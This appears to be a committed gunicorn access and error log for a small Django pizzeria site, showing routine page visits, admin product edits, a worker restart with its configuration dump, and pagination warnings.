+ - - [11/Feb/2025:18:16:17 +0000] "GET /checkout HTTP/1.1" 301 0 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 18:16:18 +0000] [18703] [DEBUG] GET /checkout/
+ - - [11/Feb/2025:18:16:18 +0000] "GET /checkout/ HTTP/1.1" 200 4219 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 18:20:12 +0000] [18701] [DEBUG] GET /
+ - - [11/Feb/2025:18:20:12 +0000] "GET / HTTP/1.1" 200 6637 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 18:20:35 +0000] [18699] [DEBUG] GET /
+ - - [11/Feb/2025:18:20:35 +0000] "GET / HTTP/1.1" 200 6637 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 18:20:38 +0000] [18703] [DEBUG] GET /
+ - - [11/Feb/2025:18:20:38 +0000] "GET / HTTP/1.1" 200 6637 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36"
+[2025-02-11 18:20:41 +0000] [18700] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [11/Feb/2025:18:20:41 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36"
+[2025-02-11 18:23:49 +0000] [18701] [DEBUG] GET /checkout
+ - - [11/Feb/2025:18:23:49 +0000] "GET /checkout HTTP/1.1" 301 0 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36"
+[2025-02-11 18:23:49 +0000] [18703] [DEBUG] GET /checkout/
+ - - [11/Feb/2025:18:23:49 +0000] "GET /checkout/ HTTP/1.1" 200 4219 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36"
+[2025-02-11 18:24:52 +0000] [18699] [DEBUG] GET /
+ - - [11/Feb/2025:18:24:52 +0000] "GET /?item_name=Pizza HTTP/1.1" 200 5859 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36"
+[2025-02-11 18:42:51 +0000] [18703] [DEBUG] GET /
+ - - [11/Feb/2025:18:42:51 +0000] "GET / HTTP/1.1" 200 6637 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:42:52 +0000] [18705] [DEBUG] GET /
+ - - [11/Feb/2025:18:42:52 +0000] "GET / HTTP/1.1" 200 6637 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:42:54 +0000] [18705] [DEBUG] GET /
+ - - [11/Feb/2025:18:42:54 +0000] "GET / HTTP/1.1" 200 6637 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:43:21 +0000] [18698] [INFO] Handling signal: term
+[2025-02-11 18:43:21 +0000] [18699] [INFO] Worker exiting (pid: 18699)
+[2025-02-11 18:43:21 +0000] [18701] [INFO] Worker exiting (pid: 18701)
+[2025-02-11 18:43:21 +0000] [18702] [INFO] Worker exiting (pid: 18702)
+[2025-02-11 18:43:21 +0000] [18703] [INFO] Worker exiting (pid: 18703)
+[2025-02-11 18:43:21 +0000] [18700] [INFO] Worker exiting (pid: 18700)
+[2025-02-11 18:43:21 +0000] [18705] [INFO] Worker exiting (pid: 18705)
+[2025-02-11 18:43:21 +0000] [18698] [ERROR] Worker (pid:18701) was sent SIGTERM!
+[2025-02-11 18:43:21 +0000] [18698] [ERROR] Worker (pid:18703) was sent SIGTERM!
+[2025-02-11 18:43:21 +0000] [18698] [ERROR] Worker (pid:18702) was sent SIGTERM!
+[2025-02-11 18:43:21 +0000] [18698] [ERROR] Worker (pid:18699) was sent SIGTERM!
+[2025-02-11 18:43:21 +0000] [18698] [ERROR] Worker (pid:18705) was sent SIGTERM!
+[2025-02-11 18:43:21 +0000] [18698] [INFO] Shutting down: Master
+[2025-02-11 18:43:21 +0000] [19480] [DEBUG] Current configuration:
+  config: ./gunicorn.conf.py
+  wsgi_app: None
+  bind: ['unix:/run/pizza.socket']
+  backlog: 2048
+  workers: 6
+  worker_class: sync
+  threads: 1
+  worker_connections: 1000
+  max_requests: 0
+  max_requests_jitter: 0
+  timeout: 30
+  graceful_timeout: 30
+  keepalive: 2
+  limit_request_line: 4094
+  limit_request_fields: 100
+  limit_request_field_size: 8190
+  reload: False
+  reload_engine: auto
+  reload_extra_files: []
+  spew: False
+  check_config: False
+  print_config: False
+  preload_app: False
+  sendfile: None
+  reuse_port: False
+  chdir: /home/kaikydsousa/PizzariaDjango
+  daemon: False
+  raw_env: []
+  pidfile: None
+  worker_tmp_dir: None
+  user: 1002
+  group: 33
+  umask: 0
+  initgroups: False
+  tmp_upload_dir: None
+  secure_scheme_headers: {'X-FORWARDED-PROTOCOL': 'ssl', 'X-FORWARDED-PROTO': 'https', 'X-FORWARDED-SSL': 'on'}
+  forwarded_allow_ips: ['127.0.0.1', '::1']
+  accesslog: -
+  disable_redirect_access_to_syslog: False
+  access_log_format: %(h)s %(l)s %(u)s %(t)s "%(r)s" %(s)s %(b)s "%(f)s" "%(a)s"
+  errorlog: /home/kaikydsousa/PizzariaDjango/gunicorn-error-log
+  loglevel: debug
+  capture_output: True
+  logger_class: gunicorn.glogging.Logger
+  logconfig: None
+  logconfig_dict: {}
+  logconfig_json: None
+  syslog_addr: udp://localhost:514
+  syslog: False
+  syslog_prefix: None
+  syslog_facility: user
+  enable_stdio_inheritance: True
+  statsd_host: None
+  dogstatsd_tags: 
+  statsd_prefix: 
+  proc_name: None
+  default_proc_name: DjangoProject.wsgi:application
+  pythonpath: None
+  paste: None
+  on_starting: <function OnStarting.on_starting at 0x7f81b33d8900>
+  on_reload: <function OnReload.on_reload at 0x7f81b33d8a40>
+  when_ready: <function WhenReady.when_ready at 0x7f81b33d8b80>
+  pre_fork: <function Prefork.pre_fork at 0x7f81b33d8cc0>
+  post_fork: <function Postfork.post_fork at 0x7f81b33d8e00>
+  post_worker_init: <function PostWorkerInit.post_worker_init at 0x7f81b33d8f40>
+  worker_int: <function WorkerInt.worker_int at 0x7f81b33d9080>
+  worker_abort: <function WorkerAbort.worker_abort at 0x7f81b33d91c0>
+  pre_exec: <function PreExec.pre_exec at 0x7f81b33d9300>
+  pre_request: <function PreRequest.pre_request at 0x7f81b33d9440>
+  post_request: <function PostRequest.post_request at 0x7f81b33d94e0>
+  child_exit: <function ChildExit.child_exit at 0x7f81b33d9620>
+  worker_exit: <function WorkerExit.worker_exit at 0x7f81b33d9760>
+  nworkers_changed: <function NumWorkersChanged.nworkers_changed at 0x7f81b33d98a0>
+  on_exit: <function OnExit.on_exit at 0x7f81b33d99e0>
+  ssl_context: <function NewSSLContext.ssl_context at 0x7f81b33d9bc0>
+  proxy_protocol: False
+  proxy_allow_ips: ['127.0.0.1', '::1']
+  keyfile: None
+  certfile: None
+  ssl_version: 2
+  cert_reqs: 0
+  ca_certs: None
+  suppress_ragged_eofs: True
+  do_handshake_on_connect: False
+  ciphers: None
+  raw_paste_global_conf: []
+  permit_obsolete_folding: False
+  strip_header_spaces: False
+  permit_unconventional_http_method: False
+  permit_unconventional_http_version: False
+  casefold_http_method: False
+  forwarder_headers: ['SCRIPT_NAME', 'PATH_INFO']
+  header_map: drop
+[2025-02-11 18:43:21 +0000] [19480] [INFO] Starting gunicorn 23.0.0
+[2025-02-11 18:43:21 +0000] [19480] [DEBUG] Arbiter booted
+[2025-02-11 18:43:21 +0000] [19480] [INFO] Listening at: unix:/run/pizza.socket (19480)
+[2025-02-11 18:43:21 +0000] [19480] [INFO] Using worker: sync
+[2025-02-11 18:43:21 +0000] [19481] [INFO] Booting worker with pid: 19481
+[2025-02-11 18:43:21 +0000] [19482] [INFO] Booting worker with pid: 19482
+[2025-02-11 18:43:22 +0000] [19483] [INFO] Booting worker with pid: 19483
+[2025-02-11 18:43:22 +0000] [19484] [INFO] Booting worker with pid: 19484
+[2025-02-11 18:43:22 +0000] [19485] [INFO] Booting worker with pid: 19485
+[2025-02-11 18:43:22 +0000] [19486] [INFO] Booting worker with pid: 19486
+[2025-02-11 18:43:22 +0000] [19480] [DEBUG] 6 workers
+[2025-02-11 18:43:29 +0000] [19483] [DEBUG] GET /
+/home/kaikydsousa/PizzariaDjango/pedidos/views.py:16: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'pedidos.models.Produto'> QuerySet.
+  paginator = Paginator(produto_objetos, 4)
+ - - [11/Feb/2025:18:43:29 +0000] "GET / HTTP/1.1" 200 6582 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:44:30 +0000] [19483] [DEBUG] GET /
+ - - [11/Feb/2025:18:44:30 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 18:44:30 +0000] [19483] [DEBUG] Ignoring EPIPE
+[2025-02-11 18:44:44 +0000] [19482] [DEBUG] GET /
+/home/kaikydsousa/PizzariaDjango/pedidos/views.py:16: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'pedidos.models.Produto'> QuerySet.
+  paginator = Paginator(produto_objetos, 4)
+ - - [11/Feb/2025:18:44:44 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 18:44:44 +0000] [19482] [DEBUG] Ignoring EPIPE
+[2025-02-11 18:44:45 +0000] [19484] [DEBUG] GET /
+/home/kaikydsousa/PizzariaDjango/pedidos/views.py:16: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'pedidos.models.Produto'> QuerySet.
+  paginator = Paginator(produto_objetos, 4)
+ - - [11/Feb/2025:18:44:45 +0000] "GET / HTTP/1.1" 200 6582 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 18:45:04 +0000] [19481] [DEBUG] GET /admin/
+ - - [11/Feb/2025:18:45:04 +0000] "GET /admin/ HTTP/1.1" 302 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:45:04 +0000] [19481] [DEBUG] GET /admin/login/
+ - - [11/Feb/2025:18:45:04 +0000] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 4160 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:45:18 +0000] [19486] [DEBUG] POST /admin/login/
+ - - [11/Feb/2025:18:45:19 +0000] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0 "http://34.39.141.209/admin/login/?next=/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:45:19 +0000] [19485] [DEBUG] GET /admin/
+ - - [11/Feb/2025:18:45:19 +0000] "GET /admin/ HTTP/1.1" 200 10737 "http://34.39.141.209/admin/login/?next=/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:46:00 +0000] [19486] [DEBUG] GET /admin/pedidos/produto/
+ - - [11/Feb/2025:18:46:00 +0000] "GET /admin/pedidos/produto/ HTTP/1.1" 200 9832 "http://34.39.141.209/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:46:01 +0000] [19483] [DEBUG] GET /admin/jsi18n/
+ - - [11/Feb/2025:18:46:01 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 3342 "http://34.39.141.209/admin/pedidos/produto/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:46:37 +0000] [19482] [DEBUG] GET /admin/pedidos/produto/6/change/
+ - - [11/Feb/2025:18:46:37 +0000] "GET /admin/pedidos/produto/6/change/ HTTP/1.1" 200 12157 "http://34.39.141.209/admin/pedidos/produto/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:46:37 +0000] [19486] [DEBUG] GET /admin/jsi18n/
+ - - [11/Feb/2025:18:46:37 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 3342 "http://34.39.141.209/admin/pedidos/produto/6/change/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:47:08 +0000] [19484] [DEBUG] POST /admin/pedidos/produto/6/change/
+ - - [11/Feb/2025:18:47:08 +0000] "POST /admin/pedidos/produto/6/change/ HTTP/1.1" 302 0 "http://34.39.141.209/admin/pedidos/produto/6/change/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:47:09 +0000] [19485] [DEBUG] GET /admin/pedidos/produto/
+ - - [11/Feb/2025:18:47:09 +0000] "GET /admin/pedidos/produto/ HTTP/1.1" 200 10047 "http://34.39.141.209/admin/pedidos/produto/6/change/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:47:09 +0000] [19481] [DEBUG] GET /admin/jsi18n/
+ - - [11/Feb/2025:18:47:09 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 3342 "http://34.39.141.209/admin/pedidos/produto/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:47:34 +0000] [19486] [DEBUG] GET /admin/pedidos/produto/6/change/
+ - - [11/Feb/2025:18:47:34 +0000] "GET /admin/pedidos/produto/6/change/ HTTP/1.1" 200 11975 "http://34.39.141.209/admin/pedidos/produto/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:47:34 +0000] [19482] [DEBUG] GET /admin/jsi18n/
+ - - [11/Feb/2025:18:47:34 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 3342 "http://34.39.141.209/admin/pedidos/produto/6/change/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:47:58 +0000] [19483] [DEBUG] POST /admin/pedidos/produto/6/change/
+ - - [11/Feb/2025:18:47:58 +0000] "POST /admin/pedidos/produto/6/change/ HTTP/1.1" 302 0 "http://34.39.141.209/admin/pedidos/produto/6/change/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:47:58 +0000] [19483] [DEBUG] GET /admin/pedidos/produto/add/
+ - - [11/Feb/2025:18:47:58 +0000] "GET /admin/pedidos/produto/add/ HTTP/1.1" 200 11787 "http://34.39.141.209/admin/pedidos/produto/6/change/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:47:58 +0000] [19486] [DEBUG] GET /admin/jsi18n/
+ - - [11/Feb/2025:18:47:58 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 3342 "http://34.39.141.209/admin/pedidos/produto/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:48:01 +0000] [19485] [DEBUG] GET /admin/pedidos/produto/6/change/
+ - - [11/Feb/2025:18:48:01 +0000] "GET /admin/pedidos/produto/6/change/ HTTP/1.1" 200 12146 "http://34.39.141.209/admin/pedidos/produto/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:48:25 +0000] [19483] [DEBUG] POST /admin/pedidos/produto/6/change/
+ - - [11/Feb/2025:18:48:25 +0000] "POST /admin/pedidos/produto/6/change/ HTTP/1.1" 302 0 "http://34.39.141.209/admin/pedidos/produto/6/change/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:48:25 +0000] [19486] [DEBUG] GET /admin/pedidos/produto/
+ - - [11/Feb/2025:18:48:25 +0000] "GET /admin/pedidos/produto/ HTTP/1.1" 200 10047 "http://34.39.141.209/admin/pedidos/produto/6/change/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:48:25 +0000] [19486] [DEBUG] GET /admin/jsi18n/
+ - - [11/Feb/2025:18:48:25 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 3342 "http://34.39.141.209/admin/pedidos/produto/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:49:36 +0000] [19486] [DEBUG] GET /admin/pedidos/produto/6/change/
+ - - [11/Feb/2025:18:49:36 +0000] "GET /admin/pedidos/produto/6/change/ HTTP/1.1" 200 11989 "http://34.39.141.209/admin/pedidos/produto/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:49:36 +0000] [19486] [DEBUG] GET /admin/jsi18n/
+ - - [11/Feb/2025:18:49:36 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 3342 "http://34.39.141.209/admin/pedidos/produto/6/change/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:49:40 +0000] [19485] [DEBUG] POST /admin/pedidos/produto/6/change/
+ - - [11/Feb/2025:18:49:40 +0000] "POST /admin/pedidos/produto/6/change/ HTTP/1.1" 302 0 "http://34.39.141.209/admin/pedidos/produto/6/change/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:49:41 +0000] [19485] [DEBUG] GET /admin/pedidos/produto/
+ - - [11/Feb/2025:18:49:41 +0000] "GET /admin/pedidos/produto/ HTTP/1.1" 200 10047 "http://34.39.141.209/admin/pedidos/produto/6/change/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:49:41 +0000] [19481] [DEBUG] GET /admin/jsi18n/
+ - - [11/Feb/2025:18:49:41 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 3342 "http://34.39.141.209/admin/pedidos/produto/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:49:53 +0000] [19482] [DEBUG] GET /admin/pedidos/produto/5/change/
+ - - [11/Feb/2025:18:49:53 +0000] "GET /admin/pedidos/produto/5/change/ HTTP/1.1" 200 11919 "http://34.39.141.209/admin/pedidos/produto/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:49:53 +0000] [19484] [DEBUG] GET /admin/jsi18n/
+ - - [11/Feb/2025:18:49:53 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 3342 "http://34.39.141.209/admin/pedidos/produto/5/change/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:50:00 +0000] [19481] [DEBUG] GET /admin/pedidos/produto/
+ - - [11/Feb/2025:18:50:00 +0000] "GET /admin/pedidos/produto/ HTTP/1.1" 200 9832 "http://34.39.141.209/admin/pedidos/produto/6/change/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:50:01 +0000] [19481] [DEBUG] GET /admin/pedidos/produto/6/change/
+ - - [11/Feb/2025:18:50:01 +0000] "GET /admin/pedidos/produto/6/change/ HTTP/1.1" 200 11930 "http://34.39.141.209/admin/pedidos/produto/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:50:02 +0000] [19481] [DEBUG] GET /admin/jsi18n/
+ - - [11/Feb/2025:18:50:02 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 3342 "http://34.39.141.209/admin/pedidos/produto/6/change/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:50:06 +0000] [19481] [DEBUG] POST /admin/pedidos/produto/6/change/
+ - - [11/Feb/2025:18:50:06 +0000] "POST /admin/pedidos/produto/6/change/ HTTP/1.1" 302 0 "http://34.39.141.209/admin/pedidos/produto/6/change/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:50:06 +0000] [19483] [DEBUG] GET /admin/pedidos/produto/
+ - - [11/Feb/2025:18:50:06 +0000] "GET /admin/pedidos/produto/ HTTP/1.1" 200 10047 "http://34.39.141.209/admin/pedidos/produto/6/change/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:50:07 +0000] [19483] [DEBUG] GET /admin/jsi18n/
+ - - [11/Feb/2025:18:50:07 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 3342 "http://34.39.141.209/admin/pedidos/produto/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:50:14 +0000] [19482] [DEBUG] GET /admin/pedidos/produto/
+ - - [11/Feb/2025:18:50:14 +0000] "GET /admin/pedidos/produto/ HTTP/1.1" 200 9832 "http://34.39.141.209/admin/pedidos/produto/6/change/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:50:16 +0000] [19482] [DEBUG] GET /admin/pedidos/produto/6/change/
+ - - [11/Feb/2025:18:50:16 +0000] "GET /admin/pedidos/produto/6/change/ HTTP/1.1" 200 11923 "http://34.39.141.209/admin/pedidos/produto/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:50:16 +0000] [19486] [DEBUG] GET /admin/jsi18n/
+ - - [11/Feb/2025:18:50:16 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 3342 "http://34.39.141.209/admin/pedidos/produto/6/change/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:50:27 +0000] [19481] [DEBUG] POST /admin/pedidos/produto/6/change/
+ - - [11/Feb/2025:18:50:27 +0000] "POST /admin/pedidos/produto/6/change/ HTTP/1.1" 302 0 "http://34.39.141.209/admin/pedidos/produto/6/change/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:50:27 +0000] [19482] [DEBUG] GET /admin/pedidos/produto/
+ - - [11/Feb/2025:18:50:27 +0000] "GET /admin/pedidos/produto/ HTTP/1.1" 200 10047 "http://34.39.141.209/admin/pedidos/produto/6/change/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:50:27 +0000] [19482] [DEBUG] GET /admin/jsi18n/
+ - - [11/Feb/2025:18:50:27 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 3342 "http://34.39.141.209/admin/pedidos/produto/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:50:32 +0000] [19483] [DEBUG] GET /
+ - - [11/Feb/2025:18:50:32 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:50:36 +0000] [19485] [DEBUG] GET /
+/home/kaikydsousa/PizzariaDjango/pedidos/views.py:16: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'pedidos.models.Produto'> QuerySet.
+  paginator = Paginator(produto_objetos, 4)
+ - - [11/Feb/2025:18:50:36 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:54:04 +0000] [19484] [DEBUG] GET /
+ - - [11/Feb/2025:18:54:04 +0000] "GET / HTTP/1.1" 200 6355 "-" "-"
+[2025-02-11 18:57:11 +0000] [19485] [DEBUG] GET /admin/
+ - - [11/Feb/2025:18:57:11 +0000] "GET /admin/ HTTP/1.1" 200 10809 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 19:06:21 +0000] [19481] [DEBUG] GET /
+/home/kaikydsousa/PizzariaDjango/pedidos/views.py:16: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'pedidos.models.Produto'> QuerySet.
+  paginator = Paginator(produto_objetos, 4)
+ - - [11/Feb/2025:19:06:21 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
+[2025-02-11 19:06:24 +0000] [19482] [DEBUG] GET /
+ - - [11/Feb/2025:19:06:24 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
+[2025-02-11 19:16:44 +0000] [19484] [DEBUG] GET /
+ - - [11/Feb/2025:19:16:44 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+[2025-02-11 19:46:15 +0000] [19483] [DEBUG] GET /
+ - - [11/Feb/2025:19:46:15 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 19:46:16 +0000] [19483] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [11/Feb/2025:19:46:16 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 19:46:35 +0000] [19483] [DEBUG] GET /
+ - - [11/Feb/2025:19:46:35 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 19:46:43 +0000] [19486] [DEBUG] GET /checkout/
